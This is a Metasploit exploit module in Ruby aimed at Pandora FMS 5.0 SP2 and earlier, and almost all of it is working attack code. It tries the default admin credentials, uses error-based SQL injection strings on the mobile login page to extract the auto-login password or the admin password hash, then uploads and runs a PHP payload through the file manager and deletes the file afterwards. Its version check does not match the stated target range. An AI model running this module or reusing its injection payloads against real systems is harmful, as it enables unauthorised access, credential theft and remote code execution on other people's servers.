
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Pandora FMS version <= 5.0 SP2 Remote Code Execution',
      'Description'    => %q{
        This module attempts to exploit multiple issues in order to gain remote
        code execution under Pandora FMS version <= 5.0 SP2.  First, an attempt
        to authenticate using default credentials is performed.  If this method
        fails, a SQL injection vulnerability is leveraged in order to extract
        the "Auto Login" password hash.  If this value is not set, the module
        will then extract the administrator account's MD5 password hash.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Lincoln <Lincoln[at]corelan.be>', # Discovery, Original Proof of Concept
          'Jason Kratzer <pyoor[at]corelan.be>' # Metasploit Module
        ],
      'References'     =>
        [
          ['URL', 'http://pandorafms.com/downloads/whats_new_5-SP3.pdf']
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['Pandora FMS version <= 5.0 SP2', {}]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 50000,
          'DisableNops' => true,
        },
      'DisclosureDate' => "Feb 1 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The URI of the vulnerable Pandora FMS instance', '/pandora_console/']),
          OptString.new('USER', [false, "The username to authenticate with", "admin"]),
          OptString.new('PASS', [false, "The password to authenticate with", "pandora"]),
        ], self.class)
  end

  def uri
    return target_uri.path
  end


  def check
    # Check version
    vprint_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "index.php")
    })

    if res and res.code == 200 and res.body =~ /Pandora FMS - the Flexible Monitoring System/ and res.body =~ /(?<=xx-small;">v)(.*?)(?=<\/td>)/
      version = $1
      vprint_status("#{peer} - Pandora FMS version #{version} detected")
    else
      vprint_status("#{peer} - Unable to access Pandora FMS")
      return Exploit::CheckCode::Unknown
    end

    if version and version <= "4.1.1"
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end


  def authenticate
    print_status("#{peer} - Attempting to authenticate using (#{datastore['USER']}:#{datastore['PASS']})")
    # Attempt to login with default credentials (admin:pandora)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "index.php"),
      'vars_get' => {
        'login' => "1",
      },
      'vars_post' => {
        'nick' => datastore['USER'],
        'pass' => datastore['PASS'],
        'Login' => "Login",
      }
    })

    if res && res.code == 200 and res.body =~ /Welcome to Pandora FMS/
      print_status("#{peer} - Successfully authenticated!")
      print_status("#{peer} - Attempting to retrieve session cookie")
      if (res.headers['Set-Cookie'] =~ /PHPSESSID/) and res.headers['Set-Cookie'].split("PHPSESSID")[-1] =~ /=(.*);/
        @session = $1
        print_status("#{peer} - Successfully retrieved session cookie: PHPSESSID=#{@session}")
        return true
      else
        print_error("#{peer} - Error retrieving cookie!")
      end
    else
      print_error("#{peer} - Authentication failed!")
    end
    return false
  end


  def loginhash
    print_status("#{peer} - Attempting to extract auto login hash")
    # Generate random string and convert to hex
    sqlq = rand_text_alpha(8)
    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join
    # select value from tconfig where token = 'loginhash_pwd';
    sqli = "1' AND (SELECT 2243 FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST"
    sqli << "(value AS CHAR),0x20)),1,50) FROM tconfig WHERE token = 0x6c6f67696e686173685f707764 "
    sqli << "LIMIT 0,1),0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP "
    sqli << "BY x)a) AND 'msf'='msf"

    # Extract session id from database
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri("#{uri}", "mobile/index.php"),
      'vars_post' => {
        'action' => "login",
        'user' => sqli,
        'password' => 'pass',
        'input' => 'Login'
      }
    })

    if res && res.code == 200 and res.body =~ /(?<=#{sqlq})(.*)(?=#{sqlq})/
      password = $1
      if password && password.length != 0
        print_status("#{peer} - Extracted auto login password (#{password})")
      else
        print_error("#{peer} - No auto login password has been defined!")
        return false
      end
    else
      print_error("#{peer} - Unable to extract auto login password!")
      return false
    end

    print_status("#{peer} - Attempting to authenticate using (admin:#{password})")
    # Attempt to login using login hash password
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "index.php"),
      'vars_get' => {
        'loginhash' => "auto",
      },
      'vars_post' => {
        'loginhash_data' => Rex::Text.md5("admin#{password}"),
        'loginhash_user' => "admin",
      }
    })

    if res && res.code == 200 and res.body =~ /Welcome to Pandora FMS/
      print_status("#{peer} - Successfully authenticated!")
      print_status("#{peer} - Attempting to retrieve session cookie")
      if (res.headers['Set-Cookie'] =~ /PHPSESSID/) and res.headers['Set-Cookie'].split("PHPSESSID")[-1] =~ /=(.*);/
        @session = $1
        print_status("#{peer} - Successfully retrieved session cookie: PHPSESSID=#{@session}")
        return true
      else
        print_error("#{peer} - Error retrieving cookie!")
      end

    else
      print_error("#{peer} - Authentication failed!")
    end

  end


  def extract
    @rce_failed = true
    print_status("#{peer} - Attempting to extract admin password hash")
    # Generate random string and convert to hex
    sqlq = rand_text_alpha(8)
    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join
    # select password from tusuario where id_user = 0;
    sqli = "test' AND (SELECT 5612 FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL"
    sqli << "(CAST(password AS CHAR),0x20)),1,50) FROM tusuario WHERE id_user = 0 LIMIT 0,1)"
    sqli << ",0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY "
    sqli << "x)a) AND 'msf'='msf"

    # Extract password hash from database
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri("#{uri}", "mobile/index.php"),
      'vars_post' => {
        'action' => "login",
        'user' => sqli,
        'password' => 'pass',
        'input' => 'Login'
      }
    })

    if res && res.code == 200 and res.body =~ /(?<=#{sqlq})(.*)(?=#{sqlq})/
      password = $1
      if password && password.length != 0
        print_status("#{peer} - Extracted admin password hash - [ #{password} ]")
      end
    else
      print_error("#{peer} - Unable to extract password hash!")
      return false
    end
    fail_with(Failure::Unknown, "#{peer} - Unable to perform remote code execution!")
  end


  def upload
    # Extract hash and hash2 from response
    res = send_request_cgi({
      'method' => 'GET',
      'cookie' => "PHPSESSID=#{@session}",
      'uri'    => normalize_uri(uri, "index.php"),
      'vars_get' => {
        'sec' => 'gsetup',
        'sec2' => 'godmode/setup/file_manager'
      }
    })

    if res && res.code == 200 and res.body =~ /(?<=input type="submit" id="submit-go")(.*)(?=<input id="hidden-directory" name="directory" type="hidden")/
      form = $1

      # Extract hash
      if form =~ /(?<=name="hash" type="hidden"  value=")(.*?)(?=" \/>)/
        hash = $1
      else
        print_error("#{peer} - Could not extract hash from response!")
        print_error("#{peer} - Upload will fail!")
        return false
      end

      # Extract hash2
      if form =~ /(?<=name="hash2" type="hidden"  value=")(.*?)(?=" \/>)/
        hash2 = $1
      else
        print_error("#{peer} - Could not extract hash2 from response!")
        print_error("#{peer} - Upload will fail!")
        return false
      end

      # Extract real_directory
      if form =~ /(?<=name="real_directory" type="hidden"  value=")(.*?)(" \/>)/
        real_directory = $1
      else
        print_error("#{peer} - Could not extract real_directory from response!")
        print_error("#{peer} - Upload will fail!")
        return false
      end

    else
      print_error("#{peer} - Could not identify upload form!")
    end


    # Upload script
    @payload_name = "#{rand_text_alpha(8)}.php"
    post_data = Rex::MIME::Message.new
    post_data.add_part("<?php #{payload.encoded} ?>", 'text/plain', nil, %Q^form-data; name="file"; filename="#{@payload_name}"^)
    post_data.add_part('', nil, nil, 'form-data; name="unmask"')
    post_data.add_part('Go', nil, nil, 'form-data; name="go"')
    post_data.add_part(real_directory, nil, nil, 'form-data; name="real_directory"')
    post_data.add_part('images', nil, nil, 'form-data; name="directory"')
    post_data.add_part("#{hash}", nil, nil, 'form-data; name="hash"')
    post_data.add_part("#{hash2}", nil, nil, 'form-data; name="hash2"')
    post_data.add_part('1', nil, nil, 'form-data; name="upload_file_or_zip"')
    data = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    print_status("#{peer} - Attempting to inject payload")
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => "PHPSESSID=#{@session}",
      'uri'    => normalize_uri(uri, "index.php"),
      'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
      'data' => data,
      'vars_get' => {
        'sec' => 'gsetup',
        'sec2' => 'godmode/setup/file_manager'
      }
    })

    if res and res.code == 200 and res.body =~ /Upload correct/
      print_status("#{peer} - Successfully injected payload")
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to inject payload!")
    end

    # Trigger Payload
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri("#{uri}", "images/#{@payload_name}"),
      'cookie' => "PHPSESSID=#{@session}"
    })
  end


  def exploit
    # First try to authenticate using default or user-supplied credentials
    if authenticate
      upload
    elsif loginhash
      # If default credentials fail, try to extract loginhash via SQLi
      upload
    else
      # If all else fails extract password hash and exit
      extract
    end
  end


  def cleanup
    if not @rce_failed
      print_status("#{peer} - Cleaning script remnants")

      # Extract hash and hash2 from response
      res = send_request_cgi({
        'method' => 'GET',
        'cookie' => "PHPSESSID=#{@session}",
        'uri'    => normalize_uri(uri, "index.php"),
        'vars_get' => {
          'sec' => 'gsetup',
          'sec2' => 'godmode/setup/file_manager'
        }
      })

      if res && res.code == 200 and res.body =~ /(?<=#{@payload_name}<)(.*)(?=<\/tr>)/m
        form = $1

        # Extract hash
        if form =~ /(?<=name="hash" type="hidden"  value=")(.*?)(?=" \/>)/
          hash = $1
        else
          print_error("#{peer} - Could not extract hash from response!")
          print_error("#{peer} - Upload will fail!")
          return false
        end

        # Extract hash2
        if form =~ /(?<=name="hash2" type="hidden"  value=")(.*?)(?=" \/>)/
          hash2 = $1
        else
          print_error("#{peer} - Could not extract hash2 from response!")
          print_error("#{peer} - Upload will fail!")
          return false
        end

        # Extract real_directory
        if form =~ /(?<=filename" type="hidden"  value=")(.*?)(?=" \/>)/
          filepath = $1
        else
          print_error("#{peer} - Could not extract real_directory from response!  Falling back to default.")
          filepath = "/var/www/html/pandora_console/images/"
        end


      else
        print_error("#{peer} - Could not identify upload form!")
      end

      res = send_request_cgi({
        'method' => 'POST',
        'cookie' => "PHPSESSID=#{@session}",
        'uri'    => normalize_uri(uri, "index.php"),
        'vars_get' => {
          'sec' => 'gsetup',
          'sec2' => 'godmode/setup/file_manager'
        },
        'vars_post' => {
          'filename' => filepath,
          'hash' => hash,
          'hash2' => hash2,
          'directory' => 'images',
          'delete_file' => 1
        }
      })

      if res and res.code == 200 and res.body =~ /(Success)/
        print_status("#{peer} - Script removed successfully")
      else
        print_warning("#{peer} - Failed to remove #{@payload_name}")
      end
    end
  end
end